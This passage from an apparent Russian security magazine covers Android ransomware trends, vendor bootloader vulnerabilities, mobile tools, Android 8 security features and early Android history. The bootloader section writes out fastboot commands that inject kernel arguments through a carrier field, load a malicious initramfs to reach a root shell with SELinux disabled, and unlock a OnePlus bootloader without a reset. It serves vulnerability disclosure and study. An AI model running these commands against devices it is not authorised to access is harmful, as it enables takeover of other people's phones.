тоположения (у Google есть спи сок точек дос тупа и их при мерное положе‐
ние). Проблема только в том, что периодические сканы сетей могут выдать
эту информацию  треть им сторонам  (например, торговый центр может
использовать Wi‐Fi‐роутеры для трекин га посети телей).
   Чтобы пол ностью исклю чить утечку информа ции, необ ходимо также отме‐
нить пери оди ческие сканы сетей. В Android 6–7 для этого необходимо перей‐
ти в «Нас тройки → Location → Scanning» и вык лючить соответству ющую
опцию. В более старых вер сиях эта опция находит ся в Wi‐Fi → Advanced.


Эво люция мобильного ransomware
Android Mobile Ransomware: Bigger, Badder, Better? — статья об эволюции ran‐
somware. Основные тезисы:
 • Первый шифровальщик (именно шифровальщик, а не локер) был обна‐
   ружен в мае 2014 года и получил имя Simple Locker (ANDROIDOS_SIM‐
   PLOCK.AXM). Все, что он делал, — шиф ровал файлы на карте памяти.
 • Большинство шифровальщиков используют имена Adobe Flash  Player,
   Video Player и названия популярных игр.
 • Мно гие шифроваль щики используют имя  пакета, похожее на име на
   пакетов встроенных в Android приложе ний: почтового клиента, календаря
   и браузе ра.
 • Большинство шифровальщиков нацелены на жителей Ближнего Востока.
 • Основной алго ритм шиф рования — AES, место хранения ключа — в нас‐
   тройках при ложе ния (ранние версии), на сер вере (сей час).
 • Для связи с CC‐сервером могут использоваться HTTP/S, Tor и XMPP.
 • Нередко в качестве вспомога тельного средства заработка создатели
  шифровальщиков встра ивают в них средства отправки СМС и звонков
   на платные номера.
 • Часто шифровальщики получают пра ва админис тратора на устройстве,
   но только для того, чтобы зат руднить свое уда ление.





    Име на при ложе ния, пакета, икон ка и раз мер семплов ransomware


Большое иссле дование безопасности загрузчиков
Android Bootloader Vulnerabilities in Vendor Customizations — большое иссле‐
дование заг рузчиков различных смартфонов на предмет уязвимостей и скры‐
тых функций fastboot. Пос ледний представляет собой интерфейс/протокол
для управле ния загрузчи ком и час то исполь зуется для таких опе раций,
как разблокировка заг рузчика и уста новка прошивок. Одна ко многие вендоры
добавляют в него свои собственные команды, которые могут скомпромети‐
ровать механизм безопасной заг рузки (veriﬁed boot), активиро вать небезо‐
пасные фун кции ОС или дать злоумыш ленникам возможность разблокиро‐
вать загрузчик без сброса смартфона до завод ских настроек.
  Наиболее интерес ные находки иссле дователей:


Root shell с отключен ным SELinux на большинстве устройств
Motorola
Заг рузчик Motorola под держивает несколько специальных команд, которые
пос ле заг рузки прев ращаются в аргу менты ядра Linux. Например, пос ле
выполнения команды


$ fastboot oem config carrier abc

и последующей заг рузки смартфона с помощью fastboot continue ядру
будет передан аргумент carrier=abc. Пока ничего криминального. Но, конеч но
же, здесь есть проблема валидации входных дан ных, то есть воз можность
передать ядру дополнительные парамет ры с помощью особым образом
сформированной коман ды. Нап ример, выполнение такой команды:


$ fastboot oem config carrier "a rdinit=/sbin/foo"

при ведет к передаче ядру параметров carrier=a и rdinit=/sbin/foo. Это уже
нам ного интереснее. С помощью того же параметра rdinit можно заставить
ядро запустить любой бинарник из initramfs (RAM‐диск Android). Но есть дру‐
гая проблема: в initramfs нет бинарных файлов, подходящих для получе ния
root‐шелла.
  Иссле дователи  выкрутились и  из  этой  ситуации. Дело  в  том,  что
с помощью fastboot можно не только прошивать и разлочивать смартфон,
но и загружать в его оперативку любой код. Эта функция используется
для прошив ки, но если сама прошивка невозможна в случае залоченного заг‐
рузчика, то заг рузка кода — вполне.
   Чтобы исполь зовать эту возможность, достаточно собрать debug‐версию
initramfs, которая вклю чает в себя работа ющий с правами root ADB, не тре‐
бующий авто риза ции. Заг рузить этот initramfs в смартфон, дампнуть опе‐
ратив ную память смартфо на, чтобы узнать адрес загрузки, и передать этот
адрес ядру с помощью аргумента initrd:


$ fastboot oem config fsg‐id "a initrd=0x11000000,1518172"
$ fastboot flash aleph malicious.cpio.gz
... загрузчик сообщит, что прошить файл не удалось, но файл останется
 в памяти ...
$ fastboot continue
$ adb shell
shamu:/ # id
uid=0(root) gid=0(root) groups=0(root),[...] context=u:r:su:s0
shamu:/ # setenforce permissive
shamu:/ # getenforce
Permissive
shamu:/ #

По лучив права root, ата кующий также может переза писать boot‐раздел, внед‐
рив в него экс пло ит (на Nexus 6 такое возможно из‐за неполной реализации
veriﬁed boot), про извести даунгрейд загрузчика, раздела TrustZone, разбло‐
киро вать загрузчик, если такая про цеду ра уже проводилась, и перезаписать
некоторые разделы.


Раз бло кировка загрузчика и отключение verified boot в OnePlus
3/3T
Здесь все намного проще, с помощью такой команды раз блокиру ем заг‐
рузчик без сброса до заводских настро ек:


$ fastboot oem 4F500301

С помощью такой — отклю чаем механизм veriﬁed boot:


$ fastboot oem disable dm verity


Дамп опе ративной памяти Nexus 5X
Заг рузчик смар тфона позволяет вызвать kernel panic с помощью команды
fastboot oem panic. В результате появляется возможность снять дамп опе‐
ратив ной памяти с помощью интерфейса serial over USB.


Доступ к скры тым фун кциям
Не которые модели смартфонов позволяют получить дос туп  к функциям
отладки и диагностики. Например, в Nexus 6 можно  получить дос туп
к интерфейсу диагностики модема и в результате прослушивать телефонные
раз говоры, сни фать трафик, получать информацию о звонках и совершать их,
читать СМС.





                  Процесс заг рузки смартфо на


ПРИЛОЖЕНИЯ
 • Android Keyboard Gadget — приложе ние, которое позволяет превратить
   устройство в полноценную клавиатуру и мышь. Не тре бует установки
   каких‐либо прог рамм на ПК, совместимо с любыми ОС и работает в том
   числе в BIOS. Минус — нужно установить кастомное ядро (есть в комплек‐
    те).
 • Zdata — при ложение, сжи мающее данные установленных при ложений.
  В сво ей работе использует псевдоФС fusecompress, работает толь ко
   на Android 7 и выше.





                                  Zdata


ИНСТРУМЕНТЫ И СЕМПЛЫ
 • AStA — инструмент сборки при ложений для Android на самом Android.
  Представ ляет собой набор скрип тов, которые разворачивают Debian в ch‐
   root и устанав ливают в него Android SDK. Плюс прос тенький редактор
   с подсветкой син такси са;
 • AppBleed — исходный код при ложе ния, способного получить информацию
  о том, какие при ложе ния установ лены в iOS, включая место расположения
   в файловой системе и многое другое (баг исправлен в iOS 11);
 • AndroidRE — образ Docker для реверс‐инжи ниринга при ложений Android,
   вклю чает в себя эмуляторы, apktool, dex2jar, Frida, jadx, radare2 и множес‐
   тво других инструмен тов;
 • AVPASS — инстру мент для модифи кации APK с целью обхода антивирус‐
   ных систем;
 • JailbreakMe‐1.0 — исходный код пер вой вер сии эксплоита JailbreakMe,
   который позволяет выполнить джей лбрейк через бра узер;
 • Firmware.mobi — каталог загрузчиков и boot‐разделов для более чем
   полуто ра тысяч устройств.
 • twiga — скрипт для получения исчерпывающей информации об Android‐
   устройстве. Уме ет показывать имя устройства, версию Android, версию
   модема, ядра, запущенные процес сы, сетевую статис тику, таб лицу раз‐
   делов и мно гое другое.
 • node‐google‐play — библиотека и набор при меров для скачивания при‐
   ложений и получения информа ции из Google Play с помощью эмуляции
   Nexus 5X.
 • abootool — инс трумент для поиска скры тых (и потенциально небезопас‐
   ных) fastboot‐команд в загрузчиках смартфонов. Все, что нуж но, — это ска‐
   чать образ заг рузчи ка и нат равить на него скрипт.
 • objection — инстру мент иссле дования, поз воляющий внедриться в при‐
   ложение iOS или Android и про вести анализ его приват ного каталога,
   памяти, классов, методов, извлечь содержимое базы SQLite, обойти SSL‐
   пиннинг. Objection основан на Frida и умеет запус кать гаджеты и скрипты,
   соз данные для нее.





  Пример просмотра приватного катало га приложения с помощью
  objection


РАЗРАБОТКА
Анимация на осно ве физики
Introduction to Physics‐based animations in Android — статья о том, как ани‐
миро вать объекты так, что бы их переме щения подчинялись законам физики.
Нап ример, реализовать эффект пружины, когда отдаленный на некоторое
рас стояние от своего текуще го положения объект при тягивает ся обратно,
или переместить объект с пос тепен ным затуханием его скорости и отско ком
от других объектов.
  Все это можно реализовать с помощью стандартной биб лиотеки support‐
dynamic‐animation. Она вклю чает в себя два класса: SpringAnimation и FlingAn‐
imation. Пер вый реали зует тот самый эффект пружины, второй поз воляет соз‐
дать неч то вроде эффекта скольжения по льду. Использовать их очень прос‐
то. Нап ример, можно соз дать GuestorListener и повесить его на нужный View:


private GestureDetector.OnGestureListener mGestureListener = new
GestureDetector.SimpleOnGestureListener() {
    ...
    @Override
    public boolean onFling(MotionEvent downEvent, MotionEvent moveEv
ent, float velocityX, float velocityY) {
        //Fling Right/Left
        FlingAnimation flingX = new FlingAnimation(mViewTobeFlung,
DynamicAnimation.TRANSLATION_X);
        flingX.setStartVelocity(velocityX)
          .setMinValue(MIN_TRANSLATION) // minimum translationX
property
          .setMaxValue(maxTranslationX)  // maximum translationX
property
          .setFriction(FRICTION)
          .start();
        return true;
    }
};


Что такое интерпо лято ры
Understanding Interpolators in Android — хорошая статья, простым язы ком
поясняющая идею интерполяторов, используемых при анимации объ ектов
в Android. В статье есть матема тика, но для понимания логики происходящего
она не нужна. К тому же все при меры можно найти в исходном коде.


                                     Продолжение статьи →
X‐MOBILE





     Евгений Зобнин
        zobnin@glc.ru



БЕЗОПАСНОСТЬ
И ОГРАНИЧЕНИЯ





Android 8 — едва ли не самое важное обновле ние Android
за последние годы. В Oreo появился модульный дизайн, поз‐
воляющий обновлять компоненты ОС незави симо, система
ограничения фоновой работы при ложений, которая должна
продлить время работы на одном заряде, а также множество
улуч шений безопас ности, о которых мы и поговорим в этой
статье.


Сре ди всех нововведений Android 8 особое место занимают три:
 • Treble — новый модульный HAL (Hardware Abstraction Layer), который поз‐
   воляет чет ко отделить от остальной час ти ОС низкоуровневый код ОС,
   зависящий от про изво дите ля смар тфо на и чипсета;
 • система ограниче ний фонового исполнения при ложений, которая должна
   помочь в борьбе со жрущими аккумулятор приложениями, запрещая их
  фоновое исполне ние (если кратко: фоновый сервис может работать
   не доль ше пяти минут, а приложение не будет разбужено или запуще но
   от внешнего обще системного события);
 • Google Play Protect и дру гие нововведения, направленные на защиту поль‐
   зователя от зловредных при ложений, установленных как из Google Play, так
   и из сторонних источни ков.

С системой огра ниче ний фонового исполне ния все более или менее понят‐
но, а о Treble, который в перспек тиве может кар диналь но улучшить ситу ацию
с обновле ниями Android, мы уже писали. Но мы снова коснемся его в контек‐
сте обсужде ния безопас ности.


GOOGLE PLAY PROTECT
В 2012 году, практически одновременно с релизом Android 4.2, Google запус‐
тила облачный антивирус с неб роским име нем Verify Apps. Антивирус был
встро ен в сер висы Google Play, которые уста новлены почти на каждом An‐
droid‐смартфоне  как  часть набора приложе ний  Google,  поэтому одно
обновле ние сервисов Google Play быстро распространило анти вирус на мил‐
лионы устройств без ведома пользователей.
  Сегодня с помощью Verify Apps Google ска ниру ет миллиарды Android‐
устройств (два миллиарда в сум ме и один миллиард ежедневно) и пос тоянно
об этом отчи тывается, гордо рассказывая о новых цифрах. Антивирус работа‐
ет всег да и при вклю ченном интернете про веря ет каж дое установленное при‐
ложение, в том чис ле те, что пользователь ставит с карты памяти или из аль‐
тернатив ных мар кетов.
   Большинство юзеров об этом даже не подозревают и, наслушавшись
исто рий о тотальной небезопас ности Android, про дол жают уста навливать
на смартфо ны сторон ние анти вирусы. В некото рых случаях это ока зывается
пустой тратой денег, в других обо рачивается лож ными срабаты вани ями, ког‐
да анти вирус ругается на все, что может отправлять СМС, показы вать рек‐
ламу в шторке или использовать оверлеи. В третьих (и это наиболее час тый
вари ант) при водит к замедлению устройства и повышенному расходу заряда
аккумулятора.
   Чтобы решить эту проблему и показать, что на самом деле в смартфоне
уже есть анти вирус, Google придума ла штуку под названием Google Play Pro‐
tect. Это не что иное, как интерфейс, позволяющий оценить работу Verify
Apps. В Android Oreo он доступен в разделе настро ек «Безопас ность»,
в более старых версиях — в разделе «Google → Безопасность». Ценность его
невелика, но он позволяет быстро узнать, что с твоим смартфоном все
в порядке и он регулярно проверя ется (а если точнее — во время зарядки).





                         Google Play Protect

Вместе с новым интерфей сом Google вытащила наружу еще несколько инди‐
като ров работы анти виру са. Версия Play Store для Oreo показывает статус
про верки при ложе ния на его странице, а также выводит красивый зеленый
щит с надписью «Все хорошо, парень, ты защищен» в списке установленных
при ложе ний.
  Кроме того, разработчики сторон них приложе ний теперь имеют доступ
к API Verify Apps, точ нее к его маленькой частичке, которая поз воляет про‐
верить, есть ли на смартфоне вирусы, и запретить установку своего при ложе‐
ния, если это так.


СТОРОННИЕ ИСТОЧНИКИ ПРИЛОЖЕНИЙ
Процесс уста нов ки приложений из сто рон них источников также слегка изме‐
нился. Теперь, чтобы уста новить приложение не из Play Store, нет необ‐
ходимос ти акти вировать переключатель «Неизвестные источники» в разделе
«Безопасность» в настройках. Вмес то это го необ ходимо дать право устанав‐
ливать APK отдельно взятым приложениям.
  Другими словами, если ты хочешь, что бы Amazon Appstore и F‐Droid могли
устанав ливать при ложе ния, ты должен дать каж дому из них такое право. И это
дей ствительно правиль ный механизм с одним «небольшим» минусом: чтобы
установить Amazon Appstore, тебе нужен браузер, а это значит, что ему тоже
необходимо дать право установки при ложений. Пос ле этого весь механизм
защиты летит к черту. Хотя, конечно, тебе все еще надо собс твенноручно
под тверждать каж дую установку приложения.


TREBLE
В Android 8 впервые появилась реали зация инициати вы Treble, которая ста ла
самой круп ной переработкой внутренних компонентов Android со времен An‐
droid 4.0. Смысл Treble заключается в раз делении Android на две незави‐
симые части, одна из которых обеспечива ет связь с железом (ядро Linux,
драйверы и другие низкоуровневые ком поненты ОС), а другая включает
в себя саму операци онную систему Android.





            Логическое деление Android до Treble и после

В первую оче редь Treble нацелен на решение проб лемы обновле ний и фраг‐
мента ции. Произво дителям смартфо нов теперь не нужно ждать, пока про‐
изводители чип сета и другого обо рудования соиз волят выпус тить драйверы
и другие компоненты HAL для новой вер сии Android. Вмес то это го они могут
пор тировать Android на уже име ющуюся основу, и в теории он будет прек‐
расно работать.
   Разработ чики Android заявляют, что Treble также способен решить многие
проблемы безопас ности. Разработ чики не толь ко разделили ОС на две час‐
ти, но и реорганизо вали плат формен но зависи мые компоненты ОС. Каждый
из них теперь работает в жестко изолированной песочнице и общается
с компонентами ОС через типизи рованные каналы с проверкой пол номочий
(для это го в IPC‐механизм Binder внесены соот ветс твующие правки).
   Устройства, изначально работа ющие на Android 8, будут иметь преиму‐
щества Treble из коробки, но с девай сами, которые получат Android 8 в форме
обновле ния, все не так просто. Google сообщает, что работает с крупными
про изводителями устройств, чтобы реализовать Treble в рамках обновле ния,
но в то же вре мя некоторые устройства самой Google включают в себя непол‐
ную реали зацию Treble.


ЗАЩИТА ОТ ДАУНГРЕЙДА
Еще в Android 4.4 Google реали зовала механизм Veriﬁed Boot, который про‐
веряет целос тность ком понен тов ОС на всех этапах заг рузки смартфона
и поз воляет зап ретить заг рузку, если обнаружится, что загрузчик, ядро
или ОС были модифи цированы. В следующих вер сиях Android механизм неп‐
рерывно совершенство вался, но в нем всегда была одна проблема — воз‐
можность сде лать даунгрейд.
  Даунгрейд опасен тем, что может быть исполь зован для получения дос‐
тупа  к смар тфо ну с помощью «воз вращения старых багов». Допустим,
человек украл телефон, понял, что он зашифрован, запаролен, а загрузчик
заблокиро ван. Кастомную прошив ку он уста новить не может (из‐за несов‐
падения сертификата), но может откатить смар тфон к старой версии Android,
в которой был баг, поз воляющий обойти блокировщик экрана (такой был
в про шивке Samsung, например), и с его помощью получает дос туп к содер‐
жимому.
  Некоторые про изводители пытались защититься от даунгрейда своими
методами. В Android 8 теперь есть официальная реализация этой защиты.
Но она отклю чается при разбло киров ке загрузчика штатными средствами.





  Ме таданные Veriﬁed Boot теперь включают в себя Rollback Index
  для защиты от отката


ФИЛЬТР SECCOMP ДЛЯ ПРИЛОЖЕНИЙ
Seccomp — это тех нология ядра Linux, которая позволя ет ограничить список
доступных при ложе нию (и в перспек тиве опасных) системных вызовов. Нап‐
ример, можно запретить приложению использовать системный вызов execve,
который часто при меняют экс пло иты, или заб локировать сис темный вызов
listen, с помощью которого мож но повесить на сетевой порт бэкдор.
   Тех нология используется в Android уже дос таточно дав но, но применяется
в основном к сис темным ком понен там. В Android 8 seccomp‐филь тр внедрен
в zygote — про цесс, который порождает про цессы всех установленных в сис‐
тему при ложе ний.
   Разработ чики про анализировали, какие системные вызовы нужны для заг‐
рузки ОС и работы боль шинства приложений, а затем отсекли лишние. В ито‐
ге в чер ный список попали 17 из 271 сис темного вызова на ARM‐
64 и 70 из 364 на ARM. В списке оказал ся и системный вызов для под клю‐
чения swap‐раздела, так что, возможно, в Android 8 приложения для акти‐
вации свопа не заведутся.





  Краш сис темы при попытке выполнить неразрешен ный системный вызов


ЗАЩИТА ЯДРА
За прош лый год более трети уязвимос тей Android были най дены в ядре. 45%
уязвимос тей ядра, начиная с 2014 года, вызваны отсутствием проверки гра‐
ниц в функци ях копирования данных из памяти ядра в память про цес са
и обратно. Патчи с решени ем данной проб лемы были приняты в ядро Linux
еще в 2016 году (Linux 4.8), но до Android они не дошли: здесь до сих пор
используются ядра версий 3.18, 4.4 и дру гих (в зависи мости от чипсета).
Google бэкпорти ровала исправления из Linux 4.8 в 3.18 и другие вер сии ядер
Android. Теперь эти изме нения дос тупны как часть Android 8.
  Другая связан ная с ядром проблема — прямой доступ к памяти процессов
из режима ядра. Хотя само ядро обычно не использует эту воз можность,
некор рек тно написанные драйверы могут это делать, что при водит к появ‐
лению уязвимостей. Для устранения этой проблемы в ARM v8.1 появил ся
механизм PAN (Privileged Access Never), сход ный по своей функци ональнос ти
с системой SMAP (Supervisor Mode Access Prevention) в x86. Он запрещает
обращаться к памяти процессов напрямую и при нуж дает использовать фун‐
кции копиро вания памяти.
  Процессоры архитектуры ARM v8.1 пока практичес ки не рас пространены,
поэтому разработ чики Linux создали соф тверный вари ант той же функции. Он
был интегрирован в Linux 4.3 для платформы ARM и в Linux 4.10 для ARM 64.
Google бэк портировала этот механизм во все ядра Android начиная с 3.18.
   Также ядра Android 4.4 и выше теперь вклю чают в себя реали зацию
механизма KASLR (Kernel Address Space Layout Randomization), который ран‐
домизирует участки расположения кода, хипа, данных ядра в памяти при каж‐
дой заг рузке, делая атаки на ядро более сложными в реализации.
  Все ядра 3.18 и выше теперь также вклю чают в себя функцию post‐init
read‐only memory, помечающую участки памяти, которые были доступны
для записи во время инициализации ядра, как read‐only уже пос ле ини циали‐
зации.


ЗАЩИТА НАТИВНОГО КОДА
С самых первых версий Android под держивал при ложе ния, написан ные
не толь ко на Java, но и на языках C, C++ и дру гих, которые можно ском‐
пилиро вать в нативный код. Такой код размещался в разделяемой библиоте‐
ке внут ри пакета при ложения и мог быть загружен в память с помощью
механизма JNI.
  И хотя такой код оставался отрезанным от основной сис темы с помощью
песоч ниц, он мог создать проб лемы самому приложению. Допус тить ошиб ку
в коде на C++ гораздо проще, чем в коде на Java. Это язык без проверки гра‐
ниц памяти и сборщика мусора. Ошиб ки переполнения буфера в нем — такая
же обы денность, как ошиб ки обра ботки путей в веб‐при ложе ниях.
   Чтобы хоть как‐то защитить от взло ма при ложе ния, содержащие натив ный
код, Google запретила заг ружать в приложе ние, собранное для Android 8,
библиотеки,  в  которых  есть  сег менты,  помеченные  одновре менно
как исполняемые и записываемые. Это один из простейших методов борьбы
с атаками на перепол нение буфера, но раньше он применял ся только в отно‐
шении компонентов самой ОС.


СКРЫТИЕ ИНФОРМАЦИИ ОБ УСТРОЙСТВЕ
Android 8 скрывает различную информацию, позволяющую идентифици‐
ровать устройство, от приложений и других устрой ств. Android ID (Settings.
Secure.ANDROID_ID), уникальный идентифика тор Android, теперь раз личен
для каждого уста нов ленного приложения. Серийный номер устройства (an‐
droid.os.Build.SERIAL) недос тупен при ложениям, собранным для Android
8 и выше. Вместо него теперь необходимо использовать метод Build.get‐
Serial(), который тре бует подтверждения полномочия на доступ к функциям
чте ния информации о смартфоне. Содер жимое поля net.hostname теперь
пусто, а DHCP‐клиент никогда не посылает хос тнейм DHCP‐сер веру.
  Другие недоступные сто рон ним приложениям данные:
 • ro.runtime.ﬁrstboot — время последней заг рузки;
 • htc.camera.sensor.front_SN — серийный номер камеры (на устройствах
   HTC);
 • persist.service.bdroid.bdaddr — MAC‐адрес Bluetooth;
 • Settings.Secure.bluetooth_address — MAC‐адрес Bluetooth, теперь дос‐
   тупен только приложениям, у которых есть раз решение LOCAL_MAC_AD
  DRESS.

Для получе ния информа ции о системных аккаунтах теперь недостаточно раз‐
решения GET_ACCOUNTS. По умолчанию приложе ние может получить доступ
только к сво им аккаунтам (например, Gmail → акка унт Google) и дол жно явно
спрашивать пользователя о дос тупе к дру гим.
  В целях обратной совместимос ти все эти огра ниче ния действу ют только
для при ложе ний, собранных для Android 8 и выше.


РАНДОМИЗАЦИЯ MAC-АДРЕСА WI-FI
Мобильные ОС исполь зуют широковещательные зап росы Wi‐Fi не только что‐
бы най ти точку дос тупа для подклю чения, но и чтобы определить местополо‐
жение устройства в помещении. У Google и Apple есть база MAC‐адресов
точек дос тупа и их географичес кого расположе ния. Получив ответ от оче ред‐
ной точки дос тупа, устройство отправ ляет его MAC на сервер и в ответ
получает коор динаты.
   Этот механизм отлично работа ет, но его же можно повернуть и другим
образом. Круп ные торговые цен тры исполь зуют его, чтобы отслеживать
по MAC‐адресам смартфо нов перемещения покупателей, более мел кие
магазины — что бы узнать, сколь ко раз тот или иной покупатель при ходил
к ним. Но еще есть спец службы и те, кто могут продавать такую информацию
на третью сторону.
  Один из методов борьбы с этим явлением — пол ное отключение любых
сканов Wi‐Fi. В Android 6, 7, 8 это можно сделать, отклю чив опцию Settings →
Location → Scanning → Wi‐Fi Scanning, в более старых версиях — через рас‐
ширен ные настрой ки Wi‐Fi. Но гораз до более правильный подход — ран‐
домизировать MAC‐адрес при каждом ска не. В iOS такая функция появилась
еще в восьмой вер сии, однако до Android, в силу огромной фрагментации
и существования мно жества производителей чип сетов Wi‐Fi, она доб ралась
только сейчас.
  Функция ран домизации должна работать как минимум в Pixel, Pixel XL
и Nexus 5X.


WEBVIEW В ОТДЕЛЬНОМ ПРОЦЕССЕ
WebView — это базирующийся на Chromium компонент Android, позволяющий
при ложе ниям отображать в своем окне веб‐стра ницы. Его используют очень
многие при ложения, включая большую часть сторонних браузе ров.
   У WebView есть проблема — он работа ет в том же процессе, что и само
при ложе ние. Другими словами: если WebView падает, он забира ет с собой
при ложе ние, если в WebView обна руживают уязвимость, с помощью которой
можно получить контроль над процессом, — контроль можно получить
над всем приложе нием.
  В Android 8 WebView изо лирован. Он работает в отдельном процессе
в своей собственной, очень ограниченной песочнице, которая не допус кает
обращения ни к пос тоянной памяти, ни к интернету. Эту работу должно
выполнять само при ложение, а WebView оста ется только отображать стра‐
ницу.
  Кроме того, WebView теперь также может исполь зовать технологию Safe
browsing, знакомую всем пользователям Chrome. Safe browsing предупрежда‐
ет о потенциально небезопасных сай тах и требует явно подтвердить переход
на такой сайт.


ПАРОЛЬ НА ДОСТУП К ОПЦИЯМ ДЛЯ РАЗРАБОТЧИКОВ
Раздел настроек с опциями для разработчиков содержит массу инс трументов
для отладки и дам па информации об устрой стве. Самый опасный из них
ADB — средство отладки, поз воляющее получить дос туп к системному жур‐
налу, массе системной информации и даже командной строке.
  Начиная с Android 4.2 ADB требует аутен тифика ции, а сами опции для раз‐
работ чиков скрыты. Для доступа к ним необ ходимо семь раз нажать на пункт
«Номер сборки» в раз деле настро ек «О телефоне». Это никогда не было
средством защиты от злоумыш ленни ков, это средство защиты от дурака,
который может залезть в настрой ки и включить то, что включать не стоит.
  В Android 8 настройки для разработчиков действительно защище ны. К ним
нельзя получить дос туп, не введя пароль блокировки экра на.


ЗАПРЕТ НА СКРЫТОЕ ПОЛУЧЕНИЕ ПОЛНОМОЧИЙ
Одним из глав ных нововведений Android 6.0 ста ла сис тема подтвержде ния
пол номочий. Приложения  ста ли  получать пра ва на использование  тех
или иных функций смар тфона не сразу пос ле уста новки, а только после явно‐
го под тверждения со сто роны пользователя.
   Это очень важ ное новов ведение, которое тем не менее страдает от одной
очень боль шой проблемы. Оно работает только для приложений, собранных
под Android 6.0 и выше. Другими словами, если разработ чик приложения ука‐
жет в правилах сборки targetSdkVersion 22 (то есть Android 5.1), его при‐
ложение получит все полномочия автомати чес ки.
   Google была вынуж дена реализовать систему именно таким образом, что‐
бы сохранить совместимость со старым софтом, и, естественно, эту особен‐
ность сразу начали эксплуатировать соз датели разного рода вирусов. Более
того,  ее  используют  даже  некото рые  крупные  разработчики  (при вет,
Snapchat), чтобы не отвлекать пользователя окошками о необходимос ти под‐
тверждать пол номочия.
   Чтобы хоть как‐то сни зить риски, Google ре ализовала нечто под наз вани‐
ем runtime‐only permissions. Это защита, которая зак рывает определенные
пол номочия для исполь зования, пока при ложение не зап росит их явно, вне
зависи мости от того, для какой версии Android соб рано приложе ние.
  Пока в списке таких полномочий числится только ANSWER_PHONE_CALLS, то
есть воз можность отве чать на звонки.


ФУНКЦИЯ АВТОЗАПОЛНЕНИЯ ПОЛЕЙ И ФОРМ
Ме неджер паролей с функци ей авто запол нения — очень удобное и полез ное
при ложе ние, осо бенно в том случае, если под клю чать смартфон к Google нет
никакого желания. Но есть у таких приложе ний одна серьезная проблема: все
они исполь зуют в своей работе сервис Accessibility, который не только дает
прак тически полный контроль над смартфо ном, но и серьезно влияет на про‐
изводительность (в кон це концов, Accessibility был придуман совсем для дру‐
гих целей).
   Чтобы устранить этот недостаток, Google реализова ла сис тему Autoﬁll,
которая поз воля ет при ложениям заполнять поля стандартным безопасным
спо собом без использования костылей и распорок.


РЕЖИМ ИНКОГНИТО В КЛАВИАТУРЕ
Клавиатура Android (как и многие сто ронние клавиату ры) исполь зует множес‐
тво механизмов пер сонализации для помощи при вво де текста. Это и
запоми нание сде лан ного выбора автодопол нения, и пользовательский сло‐
варь, и логирование введенного текста. Клавиату ра Gboard ко все му прочему
еще и отсылает весь введенный текст на сер веры Google.
  Само собой, такое поведе ние клавиатуры может быть опас ным во многих
слу чаях. Поэтому в Android 8 теперь есть режим инкогнито для клавиату ры,
который зап рещает ей что‐либо запоминать. Он реализован как часть биб‐
лиотеки совмести мос ти и поэто му может быть активиро ван и в более ранних
версиях системы, если при ложение это под держивает.
  Пока поддержка режима инкогнито в клавиату ре есть только в Google
Chrome и ноч ных сборках Firefox.


ОДНОЙ СТРОКОЙ
 • Поддержка SSLv3 отключена из‐за уязвимости Poodle Attack.
 • HttpsURLConnection боль ше не пыта ется переключиться на более низкую
   версию TLS, если сервер некор ректно отвечает на запрос о поддержи‐
   ваемой вер сии.


ВЫВОДЫ
Система безопасности Android совершенс твуется с выходом каждой новой
версии ОС. Google реализует огромное количество защитных механизмов,
но проблема безопасности Android остается острой. Большинс тво текущих
смар тфо нов на Android 7 никогда не получат обновле ние до Android 8,
для тех, что работают на более ранних версиях, вероятность обновления
стремится к нулю.
  Проблема Android вовсе не в тотальной небезопас ности сис темы, а в том,
что произво дите ли не выпус кают обновлений. И если Treble поможет решить
эту проблему хотя бы частично, это уже будет боль шая победа.
X‐MOBILE





     КАКОЙ БЫЛА ПЕРВАЯ ВЕРСИЯ
    САМОЙ ПОПУЛЯРНОЙ ОС И КАК
     ОНА МЕНЯЛАСЬ СО ВРЕМЕНЕМ





Де сять лет назад прог раммис ты Google
выложи ли в открытый доступ первый SDK
Android и первый эмулятор, с помощью
которого можно было оце нить опе раци‐
онную сис тему. Тогда мало кто воспри нял         Денис Погребной
новую ОС серьезно. Тем инте реснее пос‐
мотреть на пер вый Android сегодня. Мы
отко пали все альфы и беты Android десяти‐
летней давности, тщатель но  их про тес‐
тировали,   расковыряли    внутренности
и теперь готовы рассказать о том, что наш‐
ли.


ANDROID M3 И M5
Немногие знают, но первой пуб личной версией Android был вов се не Android
1.0, выпущенный в 2008 году, ког да уже сущес твовала iPhone OS 2.0, а вер‐
сия под названием m3, вышедшая почти одновре менно с первым iPhone.





                                Android m3

Этот эмулятор изоб ражает HTC Sooner (он же HTC EXCA 300), который дол‐
жен был стать пер вым смартфоном на Android. Вид но, что Google метила
в бизнес‐сегмент поль зователей: владельцы BlackBerry, Nokia серии E, Sam‐
sung серии  i (i780). Пос ле выхода iPhone позиция Google рез ко поменялась,
HTC Sooner был отме нен, а в эмулято ре Android m5, выпущенном все го через
несколько месяцев, изоб ражение смар тфона стало более привычным.





                                Android m5

Несмотря на наличие клавиатуры и джойсти ка, Android m3 под держивал сен‐
сорное управле ние. На любой элемент можно было нажать, име лась поддер‐
жка свайпов (на глав ном экране свай паем впра во и влево по панели при‐
ложений, тем самым прокручивая менюш ку с этими самыми приложениями).
Под держка прокрутки спис ков жес том тоже была: можно, например, прок‐
рутить веб‐страницу в браузере.





            Исходящий вызов и групповой разговор (m3)

Вот толь ко сенсорный экран никак не упрощал поль зование устрой ством. Он
был как будто для галочки. Элементы интерфейса слиш ком мелкие и не рас‐
считаны на управле ние пальцем. Совсем другое дело — версия m5: эле мен‐
ты интерфей са боль шие. По ним сложно промахнуться. Лаунчер выглядит
хоть и необычно, но уже более знакомо (см. скрин шот): спра ва отобража ются
четыре пос ледних запущен ных приложения.
   Как и в iPhone OS, в Android m3 был пол ноценный браузер. Сегод ня он,
конечно же, почти не работает, все вре мя говорит о просроченных сер‐
тификатах, жутко тормозит, многие сай ты либо не отображает, либо показы‐
вает с искажениями и незагруженными элемен тами.





                 Xakep.ru не откры вается, но WAP работает

Впро чем, браузер не оставляет впе чатления сырого софта. Он даже не хуже,
чем стандартные браузеры, которые ставили на обыч ные телефо ны того вре‐
мени. Тут есть и закладки с историей, и функция отдельной очистки исто рии,
кеша, Cookies.
  В m5 браузер уже другой и заточен под сен сорное управле ние, однако
на этом отличия закан чиваются.





                         Браузер в m5

В обе их версиях есть предустанов ленные карты Google. Только с помощью
этого приложения сами карты посмотреть не удас тся — они не загружаются.
К счастью, даже без них можно оценить интерфейс и функциональность при‐
ложения.





           Вот что значит простые карты (слева m3, справа m5)

Красота! Не прав да ли? Даже в версии «Гуглокарт» на Java было больше фун‐
кций (да, да, Google выпус кала свои кар ты для телефонов с Java; они уме ли
